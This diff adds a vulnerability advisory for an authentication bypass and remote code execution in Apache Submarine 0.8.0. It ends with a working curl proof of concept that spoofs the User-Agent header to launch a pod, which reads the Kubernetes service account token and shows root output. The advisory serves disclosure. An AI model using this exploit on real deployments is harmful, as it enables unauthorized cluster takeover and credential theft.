@@ -1,0 +1,69 @@
+
+
+Apache Submarine 0.8.0 Authentication Bypass / Remote Code Execution
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://submarine.apache.org
+Affected version: 0.8.0
+
+Summary: Apache Submarine (Submarine for short) is an End-to-End
+Machine Learning Platform to allow data scientists to create end-to-end
+machine learning workflows. On Submarine, data scientists can finish
+each stage in the ML model lifecycle, including data exploration,
+data pipeline creation, model training, serving, and monitoring.
+
+Desc: Apache Submarine (retired to the Apache Attic) suffers from
+an authentication bypass leading to unauthenticated remote code execution.
+The security filter CommonFilter.isProtectedApi() treats any request
+whose User-Agent header matches the Python SDK pattern as not requiring
+authentication, and the User-Agent header is fully attacker-controlled,
+so any client that sets that header reaches every protected REST endpoint
+with no token. Through the experiment API an attacker can define the
+container image and command of a job, which are placed directly onto
+the launched Kubernetes pod, resulting in unauthenticated remote code
+execution on the cluster and full administrative takeover via the user
+management APIs.
+
+Tested on: Microsoft Windows 10 (x86_64)
+           Eclipse Temurin OpenJDK 21.0.6 (LTS)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6007
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6007
+
+
+13.08.2026
+
+--
+
+
+$ curl -s -w "\nHTTP %{http_code}\n" -X POST 'http://localhost:8080/api/v1/experiment' \
+  -H 'User-Agent: OpenAPI-Generator/2.5.1-t00t/python' \
+  -H 'Content-Type: application/json' \
+  --data '{
+    "meta":        { "name":"pwn", "namespace":"default", "framework":"TensorFlow" },
+    "environment": { "image":"busybox:latest" },
+    "spec": {
+      "Worker": {
+        "replicas": 1,
+        "resources": "cpu=1,memory=512M",
+        "image": "busybox:latest",
+        "cmd": "sh -c \"echo PWNED-BY-THE_ICEBREAKER--THE_SHIT; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token\""
+      }
+    }
+  }'
+
+HTTP 202 (accepted)
+
+--
+
+$ kubectl -n default get pods | grep pwn
+$ kubectl -n default logs pwn-worker-0
+   PWNED-BY-THE_ICEBREAKER--THE_SHIT
+   uid=0(root) gid=0(root) groups=0(root)
+   eyJhbGciOiJSUzI1NiIsImtpZCI6...
